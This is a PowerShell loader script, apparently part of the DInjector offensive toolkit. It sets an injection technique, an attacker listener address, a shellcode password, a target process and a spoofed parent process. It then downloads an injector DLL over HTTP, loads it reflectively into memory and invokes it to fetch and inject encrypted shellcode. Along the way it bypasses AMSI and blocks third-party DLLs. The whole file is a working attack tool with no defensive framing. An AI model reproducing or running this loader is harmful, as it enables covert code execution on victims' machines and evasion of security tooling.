<#
.DESCRIPTION

Module name. Choose from:
  
  "functionpointer",
  "functionpointerv2",
  "clipboardpointer",
  "currentthread",
  "currentthreaduuid",
  "remotethread",
  "remotethreaddll",
  "remotethreadview",
  "remotethreadsuspended",
  "remotethreadkernelcb",
  "remotethreadapc",
  "remotethreadcontext",
  "processhollow"
#>
$A = "currentthread"

# lhost
$B = "10.10.13.37"

# lport
$C = 80

# injector filename
$D = "DInjector.dll"

# encrypted shellcode filename
$E = "enc"

# password to decrypt the shellcode
$F = "Passw0rd!"

# path to the image of a newly spawned process to inject into (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
$G = "C:\Windows\System32\svchost.exe"

# existing process name to inject into (used in "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended" and "remotethreadkernelcb")
$H = "notepad"

# parent process name to spoof the original value (use "0" to disable PPID spoofing) (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
$I = "explorer"

# loaded module (DLL) name to overwrite its .text section for storing the shellcode (used in "remotethreaddll")
$J = "msvcp_win.dll"

# block 3rd-party DLLs ("True" / "False") (used in "remotethreadapc", "remotethreadcontext" and "processhollow")
$K = "True"

# bypass AMSI ("True" / "False")
$L = "True"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended", "remotethreadkernelcb")
if ($methods.Contains($A)) {
    $H = (Start-Process -WindowStyle Hidden -PassThru $H).Id
}

$methods = @("remotethreadapc", "remotethreadcontext", "processhollow")
if ($methods.Contains($A)) {
    try {
        $I = (Get-Process $I -ErrorAction Stop).Id
    }
    catch {
        $I = 0
    }
}

$cmd = "${A} /sc:http://${B}:${C}/${E} /password:${F} /image:${G} /pid:${H} /ppid:${I} /dll:${J} /blockDlls:${K} /am51:${L}"

$data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
